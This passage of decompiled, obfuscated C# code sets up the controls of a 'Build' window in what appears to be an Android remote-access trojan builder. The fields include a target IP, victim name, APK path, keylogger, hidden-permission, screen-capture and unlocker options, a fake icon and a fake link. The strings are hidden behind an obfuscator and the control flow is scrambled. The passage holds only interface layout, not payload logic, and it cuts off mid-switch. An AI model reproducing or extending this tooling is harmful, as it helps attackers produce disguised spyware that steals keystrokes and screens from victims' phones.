            num1 = (int) num2 * 673136640 ^ -1173341259;
            continue;
          case 435:
            ((Build) this).Label42.Name = EXGuarder.\u003522B7637;
            ((Build) this).Label42.Size = new Size(130, 24);
            num1 = (int) num2 * 1842518185 ^ 1556653490;
            continue;
          case 436:
            ((Build) this).listmonitor.Name = EXGuarder.\u00346347633;
            num1 = (int) num2 * -719987685 ^ 723129007;
            continue;
          case 437:
            ((Build) this).CheckAllPrims.TabIndex = 71;
            num1 = (int) num2 * 246146624 ^ -1061018889;
            continue;
          case 438:
            ((Build) this).trgtbkg.FillColor = Color.Black;
            ((Build) this).trgtbkg.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1174804693 ^ -1164575963;
            continue;
          case 439:
            componentResourceManager = new ComponentResourceManager(typeof (Build));
            num1 = (int) num2 * -1303528462 ^ 228228165;
            continue;
          case 440:
            ((Build) this).checkkeepsscreen.Style = UIStyle.Custom;
            ((Build) this).checkkeepsscreen.TabIndex = 91;
            ((Build) this).checkkeepsscreen.Text = EXGuarder.\u00305045A6D;
            num1 = (int) num2 * 407021192 ^ 1265742625;
            continue;
          case 441:
            ((Build) this).keeplivelabel.Text = EXGuarder.\u00312036F4D;
            num1 = (int) num2 * -1030351185 ^ -1843882796;
            continue;
          case 442:
            ((Build) this).listmonitor.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * -1731829762 ^ 1114576445;
            continue;
          case 443:
            ((Build) this).TextIP = new DrakeUITextBox();
            num1 = (int) num2 * -95555381 ^ 1394298005;
            continue;
          case 444:
            ((Build) this).checkcaptureonce.TabIndex = 78;
            ((Build) this).checkcaptureonce.Text = EXGuarder.\u0035F31635D;
            num1 = (int) num2 * 57453666 ^ 447990395;
            continue;
          case 445:
            ((Build) this).explainmonitortext.Size = new Size(450, 132);
            num1 = (int) num2 * -1453576852 ^ -1000679318;
            continue;
          case 446:
            ((Build) this).checksignver.TabIndex = 102;
            ((Build) this).checksignver.Text = EXGuarder.\u00361740915;
            ((Build) this).checksignver.TextAlignment = ContentAlignment.MiddleLeft;
            ((Build) this).FilePathApk.FileName = EXGuarder.\u0035C144A6E;
            ((Build) this).TOpacity.Interval = 1;
            ((Build) this).startTime.Interval = 500;
            num1 = (int) num2 * 1474939814 ^ 2134237275;
            continue;
          case 447:
            ((Build) this).Label20.ForeColor = Color.White;
            num1 = (int) num2 * 581930301 ^ 1345782364;
            continue;
          case 448:
            ((Build) this).Label45.BackColor = Color.Transparent;
            num1 = (int) num2 * -47519501 ^ 1094327996;
            continue;
          case 449:
            ((Build) this).listmonitor.HoverColor = Color.Silver;
            num1 = (int) num2 * 1891011019 ^ -551963042;
            continue;
          case 450:
            ((Build) this).Generaltext.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * 897249835 ^ -560223055;
            continue;
          case 451:
            ((Build) this).checknetwork.Cursor = Cursors.Hand;
            num1 = (int) num2 * 2027696593 ^ 550256184;
            continue;
          case 452:
            ((Build) this).DrakeUIAvatar1.Size = new Size(35, 30);
            num1 = (int) num2 * 930636647 ^ 35280018;
            continue;
          case 453:
            ((Build) this).Button3.Location = new Point(815, 615);
            num1 = (int) num2 * -2057448619 ^ -17229674;
            continue;
          case 454:
            ((Build) this).CheckBIND.TabIndex = 76;
            ((Build) this).CheckBIND.Text = EXGuarder.\u0036B477262;
            ((Build) this).CheckBIND.TextAlign = ContentAlignment.TopCenter;
            num1 = (int) num2 * 782223236 ^ -1587075125;
            continue;
          case 455:
            ((Build) this).Label6.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label6.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label6.Location = new Point(55, 270);
            num1 = (int) num2 * 613844948 ^ -1739868991;
            continue;
          case 456:
            ((Build) this).sizelabel.AutoSize = true;
            ((Build) this).sizelabel.BackColor = Color.Transparent;
            num1 = (int) num2 * -1994406058 ^ -852791352;
            continue;
          case 457:
            ((Build) this).CheckBIND.Style = UIStyle.Custom;
            num1 = (int) num2 * -1614496150 ^ 1536485731;
            continue;
          case 458:
            ((Build) this).explaintoolstext.BackColor = Color.Black;
            ((Build) this).explaintoolstext.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -794973702 ^ -1426940533;
            continue;
          case 459:
            ((Build) this).bindbodytext.Size = new Size(275, 87);
            ((Build) this).bindbodytext.TabIndex = 95;
            num1 = (int) num2 * 1467440403 ^ 1588013137;
            continue;
          case 460:
            ((Build) this).Label8.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -432227418 ^ 1466974067;
            continue;
          case 461:
            ((Build) this).Panel4.Controls.Add((Control) ((Build) this).Label28);
            num1 = (int) num2 * 924484510 ^ 428358859;
            continue;
          case 462:
            ((Build) this).CheckBIND = new DrakeUICheckBox();
            ((Build) this).CheckDraw = new DrakeUICheckBox();
            num1 = (int) num2 * -1877911950 ^ 1882367290;
            continue;
          case 463:
            ((Build) this).cusomupdateimg = new PictureBox();
            num1 = (int) num2 * -1203205672 ^ 2074012791;
            continue;
          case 464:
            ((Build) this).Label15.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 293874512 ^ -1595966434;
            continue;
          case 465:
            ((Build) this).Label15.Size = new Size(16, 19);
            ((Build) this).Label15.TabIndex = 79;
            ((Build) this).Label15.Text = EXGuarder.\u003500A6952;
            ((Build) this).checkcaptureonce.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 761575765 ^ -568059767;
            continue;
          case 466:
            ((Build) this).trakertitle.Location = new Point(12, 320);
            num1 = (int) num2 * 494822543 ^ 1374073004;
            continue;
          case 467:
            ((Build) this).namemonitor.Minimum = (double) int.MinValue;
            ((Build) this).namemonitor.Name = EXGuarder.\u0030E152A11;
            num1 = (int) num2 * 154381015 ^ -1892811411;
            continue;
          case 468:
            ((Build) this).explainmonitortext.ReadOnly = true;
            num1 = (int) num2 * -1491887276 ^ -390378550;
            continue;
          case 469:
            ((Build) this).TabPage11.Size = new Size(1004, 677);
            num1 = (int) num2 * -1076951110 ^ 1504769191;
            continue;
          case 470:
            ((Build) this).randomverbtn.Name = EXGuarder.\u00308335949;
            num1 = (int) num2 * 1594097235 ^ 828505515;
            continue;
          case 471:
            ((Build) this).idmonitor.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -1388092284 ^ -1994892488;
            continue;
          case 472:
            ((Build) this).Label24.BackColor = Color.Transparent;
            ((Build) this).Label24.Font = new Font(EXGuarder.\u00339780D77, 10f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label24.ForeColor = Color.White;
            num1 = (int) num2 * 1337946515 ^ -717927290;
            continue;
          case 473:
            ((Build) this).DrakeUIAvatar1.Text = EXGuarder.\u00373182D5A;
            ((Build) this).DrakeUIAvatar2.AvatarSize = 30;
            ((Build) this).DrakeUIAvatar2.BackColor = Color.Transparent;
            num1 = (int) num2 * 162825137 ^ -371314047;
            continue;
          case 474:
            ((Build) this).namemonitor = new DrakeUITextBox();
            ((Build) this).idmonitor = new DrakeUITextBox();
            num1 = (int) num2 * 1078434257 ^ -1661024812;
            continue;
          case 475:
            ((Build) this).Label38.AutoSize = true;
            num1 = (int) num2 * -590228933 ^ -1223748435;
            continue;
          case 476:
            ((Build) this).Label37.Location = new Point(23, 572);
            ((Build) this).Label37.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label37.Name = EXGuarder.\u0030C63463C;
            ((Build) this).Label37.Size = new Size(191, 24);
            ((Build) this).Label37.TabIndex = 46;
            num1 = (int) num2 * -909511951 ^ -1841337364;
            continue;
          case 477:
            ((Build) this).Panel2.SuspendLayout();
            ((ISupportInitialize) ((Build) this).PictureBox1).BeginInit();
            num1 = (int) num2 * 1271199352 ^ 1084628171;
            continue;
          case 478:
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).Label23);
            num1 = (int) num2 * 594738328 ^ 446670554;
            continue;
          case 479:
            ((Build) this).bindCtitle.Multiline = true;
            num1 = (int) num2 * 1234843878 ^ -963802524;
            continue;
          case 480:
            ((Build) this).TabPage14.Controls.Add((Control) ((Build) this).Panel9);
            ((Build) this).TabPage14.Controls.Add((Control) ((Build) this).Panel8);
            ((Build) this).TabPage14.Controls.Add((Control) ((Build) this).Panel1);
            num1 = (int) num2 * 331443389 ^ -1537479669;
            continue;
          case 481:
            ((Build) this).Label27.Name = EXGuarder.\u0032E5D350F;
            num1 = (int) num2 * 1366285150 ^ -1432629864;
            continue;
          case 482:
            ((Build) this).Label47.Location = new Point(493, 442);
            num1 = (int) num2 * -886407112 ^ 230677071;
            continue;
          case 483:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).trackIDtext);
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).Generaltext);
            num1 = (int) num2 * 1975974145 ^ -1270648380;
            continue;
          case 484:
            ((Build) this).TextBox1.Multiline = true;
            num1 = (int) num2 * -732606371 ^ 803900608;
            continue;
          case 485:
            ((Build) this).SelectedApk.ForePressColor = Color.FromArgb(254, 0, 0);
            ((Build) this).SelectedApk.Location = new Point(294, 0);
            num1 = (int) num2 * -1008577185 ^ 2087653607;
            continue;
          case 486:
            ((Build) this).TabPage9.Name = EXGuarder.\u0036B074628;
            num1 = (int) num2 * 2140520248 ^ 131001236;
            continue;
          case 487:
            ((Build) this).DrakeUIAvatar1.Style = UIStyle.Custom;
            ((Build) this).DrakeUIAvatar1.Symbol = 61526;
            num1 = (int) num2 * 1454104230 ^ -1029265724;
            continue;
          case 488:
            ((Build) this).Label16.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 654675802 ^ 1640471385;
            continue;
          case 489:
            ((Build) this).Label46.Text = EXGuarder.\u0036F270F51;
            num1 = (int) num2 * 874661539 ^ -220193905;
            continue;
          case 490:
            ((Build) this).panemnitor = new Panel();
            num1 = (int) num2 * 992694841 ^ -772581571;
            continue;
          case 491:
            ((Build) this).Panel8.Controls.Add((Control) ((Build) this).Label39);
            ((Build) this).Panel8.Dock = DockStyle.Top;
            ((Build) this).Panel8.Location = new Point(0, 0);
            num1 = (int) num2 * -1382615289 ^ -454098910;
            continue;
          case 492:
            ((Build) this).TabPage9 = new TabPage();
            ((Build) this).Panel3 = new Panel();
            ((Build) this).Label13 = new Label();
            num1 = (int) num2 * 209813358 ^ 1969182146;
            continue;
          case 493:
            ((Build) this).checkcatpure.Cursor = Cursors.Hand;
            num1 = (int) num2 * 874687799 ^ -1769988250;
            continue;
          case 494:
            ((Build) this).Label11.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label11.Location = new Point(55, 447);
            ((Build) this).Label11.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1494934763 ^ 853136496;
            continue;
          case 495:
            ((Build) this).CheckHidePrims.Style = UIStyle.Custom;
            num1 = (int) num2 * -1185192122 ^ 1321712779;
            continue;
          case 496:
            ((Build) this).CheckAOX.Size = new Size(403, 29);
            ((Build) this).CheckAOX.Style = UIStyle.Custom;
            num1 = (int) num2 * 1119706953 ^ -179144525;
            continue;
          case 497:
            ((Build) this).tracklist.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).tracklist.Name = EXGuarder.\u00303242F21;
            ((Build) this).tracklist.Padding = new Padding(7);
            num1 = (int) num2 * 303682475 ^ -1417824970;
            continue;
          case 498:
            ((Build) this).Label23.BackColor = Color.Transparent;
            num1 = (int) num2 * -687063933 ^ -1740048573;
            continue;
          case 499:
            ((Build) this).Notmsg.Text = EXGuarder.\u00379035969;
            num1 = (int) num2 * -1686701010 ^ -1356184118;
            continue;
          case 500:
            ((Build) this).Label25 = new Label();
            num1 = (int) num2 * 1146846095 ^ 1055712447;
            continue;
          case 501:
            ((Build) this).MainText.Name = EXGuarder.\u003332A2E74;
            num1 = (int) num2 * -1369541312 ^ -1010941082;
            continue;
          case 502:
            ((Build) this).TextBox1.ReadOnly = true;
            ((Build) this).TextBox1.Size = new Size(124, 163);
            num1 = (int) num2 * -1415340337 ^ -1440691155;
            continue;
          case 503:
            ((Build) this).TabPage12.Text = EXGuarder.\u0035B684A68;
            num1 = (int) num2 * -1030066983 ^ 311767913;
            continue;
          case 504:
            ((Build) this).Label27 = new Label();
            ((Build) this).fakeiconpic = new PictureBox();
            ((Build) this).Label23 = new Label();
            num1 = (int) num2 * -1859720648 ^ -1563897514;
            continue;
          case 505:
            ((Build) this).ToolTip1.SetToolTip((Control) ((Build) this).Label7, EXGuarder.\u003625D1F48);
            ((Build) this).Label5.AutoSize = true;
            ((Build) this).Label5.BackColor = Color.Transparent;
            num1 = (int) num2 * 1297941331 ^ 692209377;
            continue;
          case 506:
            ((Build) this).Label50 = new Label();
            ((Build) this).checkunlocker = new DrakeUICheckBox();
            ((Build) this).Label49 = new Label();
            ((Build) this).checknetwork = new DrakeUICheckBox();
            num1 = (int) num2 * -1221867023 ^ 366603604;
            continue;
          case 507:
            ((Build) this).delayaccesstext.TabIndex = 79;
            num1 = (int) num2 * 418576331 ^ -2039143251;
            continue;
          case 508:
            ((Build) this).cusomupdateimg.BackColor = Color.Black;
            num1 = (int) num2 * -1500219696 ^ 625618616;
            continue;
          case 509:
            ((Build) this).PictureBox2.BackColor = Color.Black;
            num1 = (int) num2 * 1531320361 ^ 1860873905;
            continue;
          case 510:
            ((Build) this).Label23.Name = EXGuarder.\u003220C125F;
            num1 = (int) num2 * -2081504867 ^ -1895291838;
            continue;
          case 511:
            ((Build) this).Notmsg.BackColor = Color.FromArgb(34, 34, 34);
            num1 = (int) num2 * -1759475300 ^ -1755299532;
            continue;
          case 512:
            ((Build) this).keeplivelabel = new Label();
            ((Build) this).fakepanel = new Panel();
            ((Build) this).Button1 = new DrakeUIButtonIcon();
            ((Build) this).Textfakelink = new DrakeUITextBox();
            ((Build) this).Textfakename = new DrakeUITextBox();
            num1 = (int) num2 * -1942885637 ^ 1657861097;
            continue;
          case 513:
            ((Build) this).Label18.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1584957833 ^ 35267068;
            continue;
          case 514:
            ((Build) this).tracklist.Size = new Size(299, 189);
            ((Build) this).tracklist.Style = UIStyle.Custom;
            num1 = (int) num2 * 1530149563 ^ -379743778;
            continue;
          case 515:
            ((Build) this).delayaccesstext.Name = EXGuarder.\u0034F2D6868;
            ((Build) this).delayaccesstext.Size = new Size(37, 27);
            num1 = (int) num2 * 1152573081 ^ -1786082689;
            continue;
          case 516:
            ((Build) this).checkkeepsscreen.Name = EXGuarder.\u003176A362A;
            num1 = (int) num2 * 508475365 ^ -1104751665;
            continue;
          case 517:
            ((Build) this).trakertitle.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -2032741119 ^ 613992176;
            continue;
          case 518:
            ((Build) this).panelmonitorb.Name = EXGuarder.\u00356536226;
            ((Build) this).panelmonitorb.Size = new Size(450, 132);
            ((Build) this).panelmonitorb.TabIndex = 98;
            num1 = (int) num2 * -306684409 ^ 422984892;
            continue;
          case 519:
            ((Build) this).linkmonitor.Watermark = EXGuarder.\u00314561677;
            num1 = (int) num2 * 949892436 ^ 2084416791;
            continue;
          case 520:
            ((Build) this).Label43.Location = new Point(45, 484);
            num1 = (int) num2 * 608533710 ^ 257128485;
            continue;
          case 521:
            ((Build) this).Label29.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Label29.Location = new Point(201, 33);
            ((Build) this).Label29.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 576929352 ^ 352048826;
            continue;
          case 522:
            ((Build) this).Label49.TabIndex = 104;
            num1 = (int) num2 * -1991828507 ^ -416401702;
            continue;
          case 523:
            ((Build) this).checksignver.MinimumSize = new Size(63, 0);
            ((Build) this).checksignver.Name = EXGuarder.\u00344320C4A;
            num1 = (int) num2 * 277263485 ^ 284695850;
            continue;
          case 524:
            ((Build) this).combotype.ItemHeight = 20;
            num1 = (int) num2 * -1780939006 ^ -1799706240;
            continue;
          case 525:
            ((Build) this).checkemo.Text = EXGuarder.\u00333720C44;
            ((Build) this).Checksuper.CheckBoxColor = Color.FromArgb(192, 0, 0);
            ((Build) this).Checksuper.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1163678160 ^ -2121120988;
            continue;
          case 526:
            ((Build) this).trakertitle.ForeColor = Color.White;
            num1 = (int) num2 * -1192046277 ^ -1199832265;
            continue;
          case 527:
            ((Build) this).fakeiconpic.Name = EXGuarder.\u0032D450F47;
            num1 = (int) num2 * 1783811623 ^ -1657253038;
            continue;
          case 528:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Checksuper);
            num1 = (int) num2 * -1314435637 ^ 949910216;
            continue;
          case 529:
            ((Build) this).Notmsg.TextAlign = HorizontalAlignment.Center;
            ((Build) this).Label12.AutoSize = true;
            num1 = (int) num2 * -889963665 ^ 320037309;
            continue;
          case 530:
            ((Build) this).CheckAllPrims.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 543639115 ^ -152613804;
            continue;
          case 531:
            ((Build) this).randomverbtn.FillColor = Color.Transparent;
            num1 = (int) num2 * -878791908 ^ -1565981475;
            continue;
          case 532:
            ((Build) this).Label21.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * -37468126 ^ 1051115476;
            continue;
          case 533:
            ((Build) this).Label18.BackColor = Color.Transparent;
            ((Build) this).Label18.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label18.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label18.Location = new Point(57, 71);
            num1 = (int) num2 * 902783634 ^ 1973929066;
            continue;
          case 534:
            ((Build) this).checkadmin.Size = new Size(338, 29);
            ((Build) this).checkadmin.Style = UIStyle.Custom;
            num1 = (int) num2 * -373511780 ^ -1772514706;
            continue;
          case 535:
            ((Build) this).Textfakename.Maximum = (double) int.MaxValue;
            ((Build) this).Textfakename.Minimum = (double) int.MinValue;
            ((Build) this).Textfakename.Name = EXGuarder.\u0036109060E;
            num1 = (int) num2 * -1537363610 ^ 875166697;
            continue;
          case 536:
            ((Build) this).Label19.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1509061475 ^ -1278310642;
            continue;
          case 537:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label35);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).explaintoolstext);
            num1 = (int) num2 * 472396614 ^ 674904255;
            continue;
          case 538:
            ((Build) this).checkcatpure.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).checkcatpure.ForeColor = Color.White;
            num1 = (int) num2 * 932679539 ^ -1941461956;
            continue;
          case 539:
            ((Build) this).Label50.Text = EXGuarder.\u003500A6952;
            ((Build) this).checkunlocker.CheckBoxColor = Color.FromArgb(192, 0, 0);
            ((Build) this).checkunlocker.Cursor = Cursors.Hand;
            num1 = (int) num2 * -162574156 ^ 1018538472;
            continue;
          case 540:
            ((Build) this).TabPage13 = new TabPage();
            num1 = (int) num2 * 2136800623 ^ -1828560738;
            continue;
          case 541:
            ((Build) this).Panel10.Controls.Add((Control) ((Build) this).checkcaptureonce);
            ((Build) this).Panel10.Controls.Add((Control) ((Build) this).checkcatpure);
            ((Build) this).Panel10.Dock = DockStyle.Top;
            ((Build) this).Panel10.Location = new Point(0, 0);
            num1 = (int) num2 * 2087335536 ^ 1889644255;
            continue;
          case 542:
            ((Build) this).clonecheck.ForeColor = Color.White;
            ((Build) this).clonecheck.Location = new Point(566, 541);
            ((Build) this).clonecheck.Name = EXGuarder.\u003690D366F;
            ((Build) this).clonecheck.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -1041441714 ^ -685123483;
            continue;
          case 543:
            ((Build) this).CheckIconPatch.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 537147382 ^ 1458604953;
            continue;
          case 544:
            ((Build) this).Label17 = new Label();
            ((Build) this).Label16 = new Label();
            ((Build) this).Label14 = new Label();
            ((Build) this).Label6 = new Label();
            ((Build) this).CheckRecord = new DrakeUICheckBox();
            num1 = (int) num2 * 635083974 ^ 1592391430;
            continue;
          case 545:
            ((Build) this).logbtntext.Style = UIStyle.Custom;
            num1 = (int) num2 * 1064573723 ^ -617061889;
            continue;
          case 546:
            ((Build) this).Label15 = new Label();
            num1 = (int) num2 * 993696907 ^ 1464076932;
            continue;
          case 547:
            ((Build) this).Panel1.TabIndex = 104;
            num1 = (int) num2 * -944746225 ^ 888847726;
            continue;
          case 548:
            ((Build) this).Label49.BackColor = Color.Transparent;
            ((Build) this).Label49.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label49.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * -588672883 ^ -779783875;
            continue;
          case 549:
            ((Build) this).trackIDtext.Size = new Size(191, 24);
            ((Build) this).trackIDtext.Style = UIStyle.Custom;
            num1 = (int) num2 * 470437272 ^ 1535802275;
            continue;
          case 550:
            ((Build) this).Label9.Name = EXGuarder.\u0032A3C4B69;
            num1 = (int) num2 * 1389910419 ^ 821471110;
            continue;
          case 551:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).idmonitor);
            num1 = (int) num2 * -1206330244 ^ 244486098;
            continue;
          case 552:
            ((Build) this).Primslist.Text = (string) null;
            num1 = (int) num2 * 936092973 ^ 176491708;
            continue;
          case 553:
            ((Build) this).Label12.BackColor = Color.Transparent;
            ((Build) this).Label12.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label12.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label12.Location = new Point(37, 481);
            ((Build) this).Label12.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label12.Name = EXGuarder.\u00362161A5D;
            num1 = (int) num2 * -1937495624 ^ 1644928399;
            continue;
          case 554:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).TextNamePatch);
            num1 = (int) num2 * -2132846196 ^ 1952704586;
            continue;
          case 555:
            ((Build) this).logbtntext.RectColor = Color.Transparent;
            num1 = (int) num2 * 1690518735 ^ -1061889247;
            continue;
          case 556:
            ((Build) this).randomidbtn = new DrakeUIAvatar();
            ((Build) this).TextPackage = new DrakeUITextBox();
            ((Build) this).TextNameVictim = new DrakeUITextBox();
            num1 = (int) num2 * 2109399023 ^ 352977740;
            continue;
          case 557:
            ((Build) this).Label44.TabIndex = 107;
            ((Build) this).Label44.Text = EXGuarder.\u003032A2709;
            ((Build) this).Label42.AutoSize = true;
            num1 = (int) num2 * -1650205407 ^ 1392695344;
            continue;
          case 558:
            ((Build) this).CheckSkipre.Size = new Size(363, 29);
            ((Build) this).CheckSkipre.Style = UIStyle.Custom;
            num1 = (int) num2 * -1673541982 ^ 340132966;
            continue;
          case 559:
            ((Build) this).idmonitor.Maximum = (double) int.MaxValue;
            ((Build) this).idmonitor.Minimum = (double) int.MinValue;
            ((Build) this).idmonitor.Name = EXGuarder.\u00319574D57;
            ((Build) this).idmonitor.Padding = new Padding(7, 6, 7, 6);
            ((Build) this).idmonitor.Radius = 10;
            num1 = (int) num2 * 1639625544 ^ -188740362;
            continue;
          case 560:
            ((Build) this).Label6.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 2046865051 ^ -140461520;
            continue;
          case 561:
            ((Build) this).Label13.AutoSize = true;
            ((Build) this).Label13.BackColor = Color.Transparent;
            ((Build) this).Label13.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1023361881 ^ -688966898;
            continue;
          case 562:
            ((Build) this).Panel7.BackColor = Color.Black;
            num1 = (int) num2 * 1316042081 ^ -611298366;
            continue;
          case 563:
            ((Build) this).Label24.Location = new Point(4, 114);
            ((Build) this).Label24.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1906113950 ^ 2108183160;
            continue;
          case 564:
            ((Build) this).comboproms.Size = new Size(158, 25);
            ((Build) this).comboproms.Style = UIStyle.Custom;
            ((Build) this).comboproms.TabIndex = 26;
            num1 = (int) num2 * 241464856 ^ 1138147229;
            continue;
          case 565:
            ((Build) this).bindbodytext.Multiline = true;
            num1 = (int) num2 * 1646984411 ^ 1883290174;
            continue;
          case 566:
            ((Build) this).namemonitor.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -432279324 ^ -1656984395;
            continue;
          case 567:
            ((Build) this).Label46.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -242527533 ^ -628422268;
            continue;
          case 568:
            ((Build) this).Label39.Font = new Font(EXGuarder.\u00339780D77, 9f);
            ((Build) this).Label39.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Label39.Location = new Point(-30, 0);
            ((Build) this).Label39.Name = EXGuarder.\u0032040126F;
            num1 = (int) num2 * -166048925 ^ 1216005980;
            continue;
          case 569:
            ((Build) this).Label21.Size = new Size(19, 24);
            ((Build) this).Label21.TabIndex = 39;
            num1 = (int) num2 * -1883679319 ^ -1446805096;
            continue;
          case 570:
            ((Build) this).Label14.AutoSize = true;
            num1 = (int) num2 * 924105745 ^ -467025886;
            continue;
          case 571:
            ((Build) this).Label7.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label7.Location = new Point(1336, 148);
            ((Build) this).Label7.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label7.Name = EXGuarder.\u0034A5E5879;
            ((Build) this).Label7.Size = new Size(19, 24);
            num1 = (int) num2 * 560421197 ^ -573045650;
            continue;
          case 572:
            ((Build) this).trackIDtext.Cursor = Cursors.IBeam;
            ((Build) this).trackIDtext.FillColor = Color.Black;
            num1 = (int) num2 * -617785247 ^ -39742979;
            continue;
          case 573:
            ((Build) this).Label30.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label30.Name = EXGuarder.\u0033E140E69;
            ((Build) this).Label30.Size = new Size(28, 17);
            ((Build) this).Label30.TabIndex = 46;
            num1 = (int) num2 * -1717989422 ^ 166134173;
            continue;
          case 574:
            ((Build) this).checkkeyloger = new DrakeUICheckBox();
            num1 = (int) num2 * 1567912955 ^ 1418993983;
            continue;
          case 575:
            ((Build) this).linkmonitor.FillColor = Color.Black;
            ((Build) this).linkmonitor.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 300003843 ^ 1534822654;
            continue;
          case 576:
            ((Build) this).CheckBIND.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).CheckBIND.ForeColor = Color.White;
            num1 = (int) num2 * 1896651012 ^ 1744189214;
            continue;
          case 577:
            ((Build) this).logbodytext.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).logbodytext.Multiline = true;
            ((Build) this).logbodytext.Name = EXGuarder.\u0034812260C;
            num1 = (int) num2 * -607567732 ^ -1320821279;
            continue;
          case 578:
            ((Build) this).Label42.BackColor = Color.Transparent;
            ((Build) this).Label42.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1745626491 ^ 443493901;
            continue;
          case 579:
            ((Build) this).Label23.Location = new Point(11, 144);
            ((Build) this).Label23.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1524594169 ^ 1574466130;
            continue;
          case 580:
            ((Build) this).removeactiv.Cursor = Cursors.Hand;
            num1 = (int) num2 * -37323244 ^ -1329993666;
            continue;
          case 581:
            ((Build) this).PictureBox1.TabStop = false;
            num1 = (int) num2 * 1333423028 ^ 512791037;
            continue;
          case 582:
            ((Build) this).Label47.BackColor = Color.Transparent;
            ((Build) this).Label47.Enabled = false;
            num1 = (int) num2 * 646539252 ^ -773190062;
            continue;
          case 583:
            ((Build) this).Primslist.ForeColor = Color.Black;
            ((Build) this).Primslist.HoverColor = Color.Silver;
            ((Build) this).Primslist.ItemSelectBackColor = Color.FromArgb(140, 140, 140);
            num1 = (int) num2 * -155898842 ^ -1743453535;
            continue;
          case 584:
            ((Build) this).CheckRecord.CheckBoxColor = Color.FromArgb(192, 0, 0);
            ((Build) this).CheckRecord.Cursor = Cursors.Hand;
            ((Build) this).CheckRecord.Enabled = false;
            ((Build) this).CheckRecord.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).CheckRecord.ForeColor = Color.White;
            ((Build) this).CheckRecord.Location = new Point(128, 605);
            num1 = (int) num2 * 1194134813 ^ -199131453;
            continue;
          case 585:
            ((Build) this).Label5.Enabled = false;
            ((Build) this).Label5.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 630935965 ^ -969635725;
            continue;
          case 586:
            ((Build) this).checksignver.Dock = DockStyle.Left;
            ((Build) this).checksignver.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num2 * 255704515 ^ -362676687;
            continue;
          case 587:
            ((Build) this).randomidbtn.AvatarSize = 30;
            num1 = (int) num2 * -1260657917 ^ -2102916763;
            continue;
          case 588:
            ((Build) this).Label11.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1980447708 ^ -603048125;
            continue;
          case 589:
            ((Build) this).Panel1.SuspendLayout();
            this.SuspendLayout();
            num1 = (int) num2 * -468386384 ^ 1186986656;
            continue;
          case 590:
            ((Build) this).checkcatpure.Name = EXGuarder.\u0034B683256;
